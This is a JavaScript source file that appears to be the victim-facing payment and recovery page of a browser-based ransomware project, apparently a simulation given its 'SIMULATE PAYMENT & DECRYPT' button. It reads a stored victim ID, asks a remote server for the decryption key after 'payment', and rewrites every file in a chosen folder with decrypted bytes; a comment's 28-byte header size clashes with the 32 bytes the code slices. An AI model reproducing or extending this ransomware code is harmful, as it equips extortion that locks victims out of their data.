import './style.css';
import { CryptoModule } from './modules/cryptoModule.js';
import { FileSystemModule } from './modules/fileSystemModule.js';
import { Buffer } from 'buffer';

const API_BASE_URL = process.env.API_BASE_URL.replace(/\/$/, '');

document.addEventListener('DOMContentLoaded', () => {
    const uploadId = localStorage.getItem('rob_identity');
    const uploadIdDisplay = document.getElementById('uploadId');
    let clientId = null;

    if (uploadId) {
        const data = JSON.parse(uploadId);
        clientId = data.clientId;
        if (uploadIdDisplay) uploadIdDisplay.textContent = clientId || 'N/A';
    }

    const payBtn = document.getElementById('payRansomBtn');
    const statusDiv = document.getElementById('paymentStatus');

    if (payBtn) {
        payBtn.addEventListener('click', async () => {
            if (!clientId) {
                alert("Error: No Client ID found. Cannot verify payment.");
                return;
            }

            payBtn.disabled = true;
            payBtn.textContent = "Verifying Payment...";
            if (statusDiv) {
                statusDiv.textContent = "Contacting Server...";
                statusDiv.style.color = '#e53935';
            }

            try {
                const res = await fetch(`${API_BASE_URL}/recover`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ clientId })
                });

                const data = await res.json();

                if (!res.ok || !data.success) {
                    throw new Error(data.error || "Payment failed or key not found.");
                }

                if (statusDiv) {
                    statusDiv.style.color = '#0b875b'; 
                    statusDiv.textContent = "PAYMENT VERIFIED!";
                }

                const directoryHandle = await FileSystemModule.selectDirectory();
                
                payBtn.textContent = "Decrypting...";
                
                await decryptAllFiles(directoryHandle, data.key);

                alert("Success! All files have been decrypted.");
                payBtn.textContent = "Files Restored";
                payBtn.disabled = false;

            } catch (error) {
                console.error(error);
                payBtn.disabled = false;
                payBtn.textContent = "💸 SIMULATE PAYMENT & DECRYPT";
                if (statusDiv) {
                    statusDiv.textContent = `Error: ${error.message}`;
                }
                alert(`Error: ${error.message}`);
            }
        });
    }
});


async function decryptAllFiles(directoryHandle, rawKeyBase64) {
    const files = await FileSystemModule.readAllFiles(directoryHandle);
    let processedCount = 0;

    for (const fileHandle of files) {
        try {
            const fileData = await FileSystemModule.readFileAsUint8Array(fileHandle);
            
            // Validate kích thước file tối thiểu (IV + Tag = 28 bytes)
            if (fileData.length <= 28) {
                console.warn(`Skipping ${fileHandle.name}: File too small.`);
                continue;
            }

            // debug
            console.log(`[Decrypt] Reading ${fileHandle.name}, Total Size: ${fileData.length}`);

            const iv = Buffer.from(fileData.slice(0, 16));        // 0 to 16
            const tag = Buffer.from(fileData.slice(16, 32));      // 16 to 32 (16+16)
            const ciphertext = Buffer.from(fileData.slice(32));   // 32 onwards

            console.log(`[Decrypt] IV: ${iv.length}, Tag: ${tag.length}, Content: ${ciphertext.length}`);
            
            const decryptedBytes = await CryptoModule.decryptFile(
                { iv, ciphertext, tag }, 
                rawKeyBase64
            );

            await FileSystemModule.writeBytesToHandle(fileHandle, decryptedBytes);
            processedCount++;
            console.log(`Restored: ${fileHandle.name}`);
        } catch (err) {
            console.error(`Failed to decrypt ${fileHandle.name}:`, err);
        }
    }
    console.log(`Total decrypted: ${processedCount}`);
}